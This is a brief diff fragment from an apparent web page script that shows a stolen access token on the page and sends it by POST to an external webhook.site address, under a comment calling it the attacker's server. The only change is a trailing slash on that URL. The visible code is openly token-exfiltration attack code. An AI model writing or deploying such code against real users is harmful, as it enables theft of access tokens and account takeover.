@@ -43,7 +43,7 @@
                 document.getElementById("tokenLog").textContent = `Stolen Token: ${token}`;
 
                 // Exfiltrate to attacker's server
-                fetch("https://webhook.site/07fd3bca-c584-4cdf-8ae7-3895bf6f1ceb", {
+                fetch("https://webhook.site/07fd3bca-c584-4cdf-8ae7-3895bf6f1ceb/", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({ accessToken: token })
